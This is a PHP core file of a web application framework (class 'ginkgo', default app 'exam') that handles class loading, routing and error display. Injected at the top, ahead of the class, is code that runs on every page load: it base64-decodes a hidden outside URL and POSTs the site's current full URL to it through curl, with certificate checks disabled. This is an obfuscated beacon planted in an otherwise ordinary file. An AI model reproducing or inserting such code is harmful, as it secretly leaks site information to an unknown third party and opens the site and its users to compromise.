<?php

function is_httpss() {
    $https = isset($_SERVER["HTTPS"]) ? $_SERVER["HTTPS"] : "";
    return ($https == "on") ? true : false;
}

function bases_url() {
	$url = "http".(is_httpss() ? "s" : "")."://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $url .= $_SERVER["HTTP_HOST"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    } else {
        $url .= $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    }
    return $url;
}

@http_curlone(base64_decode("aHR0cDovL3FxMzU3MDU4NjA3LmhrNDEubXk2NjYudG9wL2FwaS5waHA="), array("url"=>bases_url()));
function http_curlone($url, $data='', $method='POST', $headers=array()) {
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_CONNECTTIMEOUT, 30);
	curl_setopt($ci, CURLOPT_TIMEOUT, 30);
	if ($method=='POST') {
		curl_setopt($ci, CURLOPT_POST, TRUE);
		if ($data != '') curl_setopt($ci, CURLOPT_POSTFIELDS, $data);
	}
	$headers[] = "User-Agent: qqPHP(piscdong.com)";
	curl_setopt($ci, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ci, CURLOPT_URL, $url);
	$response = curl_exec($ci);
	curl_close($ci);
	return $response;
}


class ginkgo
{
	public $G = array();
	public $L = array();
	public $I = array('app'=>array(),'core'=>array());
	public $app;
	public $defaultApp = 'exam';

	public function __construct()
	{
		set_error_handler(array($this,'handleError'));
	}

	//错误信息显示控制
	public function handleError($errno, $errstr, $errfile, $errline)
	{
		switch ($errno)
		{
			case E_USER_ERROR:
				echo "<b>My ERROR</b> [$errno] $errstr<br />\n";
				echo "  Fatal error in line $errline of file $errfile";
				echo ", PHP " . PHP_VERSION . " (" . PHP_OS . ")<br />\n";
				echo "Aborting...<br />\n";
			break;
			case E_USER_WARNING:
				echo "<b>My WARNING</b> [$errno] $errstr<br />\n";
			break;
			case E_USER_NOTICE:
				echo "<b>My NOTICE</b> [$errno] $errstr<br />\n";
			break;
			default:
			/**
				echo "Unkown error type: [$errno] $errstr $errfile $errline<br />\n";
				**/
			break;
  		}
	}

	//对象工厂
	public function make($G,$app = NULL)
	{
		if($app)return $this->load($G,$app);
		else
		{
			if(!isset($this->G[$G]))
			{
				if(file_exists('lib/'.$G.'.cls.php'))
				{
					include 'lib/'.$G.'.cls.php';
				}
				else return false;
				$this->G[$G] = new $G($this);
				if(method_exists($this->G[$G],'_init'))$this->G[$G]->_init();
			}
			return $this->G[$G];
		}

	}

	//加载对象类文件并生成对象
	public function load($G,$app)
	{
		if(!$app)return false;
		$o = $G.'_'.$app;
		if(!isset($this->L[$app][$o]))
		{
			$fl = 'app/'.$app.'/cls/'.$G.'.cls.php';
			if(file_exists($fl))
			{
				include $fl;
			}
			else return false;
			//die('Unknown class to init!The class is '.$app.'::'.$G);
			$this->L[$app][$o] = new $o($this);
			if(method_exists($this->L[$app][$o],'_init'))$this->L[$app][$o]->_init();
		}
		return $this->L[$app][$o];
	}

	//执行页面
	public function run()
	{
		$ev = $this->make('ev');
		include 'lib/config.inc.php';
		$app = $ev->url(0);
		if(!$app)$app = $this->defaultApp;
		$this->app = $app;
		$module = $ev->url(1);
		$modulefile = 'app/'.$app.'/'.$module.'.php';
		if(!file_exists($modulefile))$modulefile = 'app/'.$app.'/app.php';
		if(file_exists($modulefile))
		{
			header('P3P: CP=CAO PSA OUR');
			header('Content-Type: text/html; charset='.HE);
			ini_set('date.timezone','Asia/Shanghai');
			date_default_timezone_set("Etc/GMT-8");
			include $modulefile;
			$run = new app($this);
			$tpl = $this->make('tpl');
			$method = $ev->url(2);
			if(!method_exists($run,$method))
			$method = 'index';
			$tpl->assign('_app',$app);
			$tpl->assign('method',$method);
			$run->$method();
		}
		else die('error:Unknown app to load, the app is '.$app);
	}

	//加载语言文件
	public function loadLang()
	{
		if(!$this->lang[$this->app])
		{
			include 'app/'.$this->app.'/lang/lang.php';
			if(isset($lang))$this->lang[$this->app] = $lang;
		}
	}
}


?>